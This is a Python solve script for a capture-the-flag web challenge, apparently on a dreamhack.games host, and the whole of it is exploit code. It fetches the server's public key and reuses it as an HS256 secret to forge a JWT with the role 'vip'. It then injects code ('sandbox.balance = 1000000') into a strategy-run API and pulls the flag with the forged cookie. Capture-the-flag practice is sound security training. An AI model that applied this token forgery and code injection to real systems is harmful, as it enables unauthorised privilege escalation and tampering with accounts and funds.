import requests
import jwt

url = "http://host3.dreamhack.games:8682/"

res = requests.get(f'{url}/helpsign')
pub_key = res.text

# forge token
token = jwt.encode(
    payload={
        'uid': 'hacked',
        'role': 'vip'
    },
    key=pub_key,
    algorithm="HS256"
)

# sandbox injection
cookies = { 'auth': token }

payload = "sandbox.balance = 1000000"
res = requests.post(f'{url}/api/strategy/run', json={ 'code': payload }, cookies=cookies)

if "error" not in res.text.lower():
    print("> Balance updated")

res = requests.post(f"{url}/api/shop/flag", cookies=cookies)
print("Flag:", res.json()['flag'])